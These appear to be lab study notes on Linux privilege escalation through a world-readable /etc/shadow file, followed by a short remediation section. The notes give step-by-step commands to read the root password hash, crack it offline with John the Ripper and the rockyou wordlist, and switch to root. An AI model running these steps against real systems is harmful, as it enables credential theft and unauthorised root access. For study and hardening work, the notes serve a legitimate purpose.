## 📝 Linux PrivEsc Notes: World-Readable `/etc/shadow` File

---

## Target Vector
Unsafe file permissions on `/etc/shadow`

## Exploit Type
Password hash extraction + offline brute-force cracking (John the Ripper)

---

# 1. Backend Concept: `/etc/shadow` Structure

The `/etc/shadow` file stores **hashed passwords for system users** and is normally readable only by `root`.

### Example entry:
```text
root:$6$aSdfG...:19145:0:99999:7:::
```

### Fields breakdown:

- `root` → username
- `$6$aSdfG...` → password hash
- remaining fields → password aging / expiry metadata

---

## Hash Type Identification

| Prefix | Algorithm |
|--------|----------|
| `$1$` | MD5 |
| `$5$` | SHA-256 |
| `$6$` | SHA-512 |

Modern Linux systems typically use **SHA-512 (`$6$`)**.

---

# 2. Step-by-Step Exploitation

---

## Step A: Permission Verification

```bash
ls -l /etc/shadow
```

### Vulnerable output example:
```text
-rw-r--r-- 1 root root ...
```

### Meaning:
- File is **world-readable**
- Any local user can extract password hashes

---

## Step B: Extract Hash

```bash
cat /etc/shadow | grep root
```

Copy the full line for the root user.

---

## Step C: Save Hash to File (Kali)

```bash
nano hash.txt
```

Paste the extracted root line and save.

---

## Step D: Prepare Wordlist (RockYou)

If required, extract wordlist:

```bash
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
```

---

## Step E: Crack Hash Using John the Ripper

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

---

## How It Works

- John generates hashes from each password in the wordlist
- Compares them with the extracted `/etc/shadow` hash
- Stops when a match is found
- Displays the cracked password

---

## Step F: Switch to Root

```bash
su root
```

Enter the cracked password.

---

### Expected Result:
```bash
whoami
root
```

---

# 🛡️ Remediation (Fixing the Issue)

---

## Restore Secure Permissions

```bash
sudo chmod 600 /etc/shadow
```

---

## Correct Permission Model

| File | Default Permission | Risk if Misconfigured |
|------|-------------------|------------------------|
| `/etc/passwd` | 644 | Low (no hashes stored) |
| `/etc/shadow` | 600 | Critical if exposed |

---

## Security Principle

- `/etc/shadow` must remain **root-only**
- Any world-readable access = full credential compromise risk

---

# 🧠 Quick Summary

- `/etc/shadow` contains password hashes, not plaintext passwords
- If readable, attackers can extract hashes
- Tools like **John the Ripper** can crack weak passwords offline
- Proper permissions (`600`) are critical for system security

---
